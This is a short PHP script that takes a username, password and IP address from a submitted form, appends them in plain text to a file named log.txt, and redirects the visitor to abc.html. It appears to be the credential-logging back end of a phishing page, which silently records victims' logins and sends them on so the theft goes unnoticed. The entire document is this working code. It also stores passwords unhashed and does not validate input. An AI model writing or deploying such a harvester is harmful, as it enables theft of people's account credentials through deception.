<?php
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $ip = $_POST['ip'];
    $text = "user: ".$user." -- pass: ".$pass." -- IP: ".$ip."\n";
    $myFile = "log.txt";
    $fh = fopen($myFile, 'a');
    fwrite($fh, $text);
    fclose($fh);
    header('Location: abc.html');
?>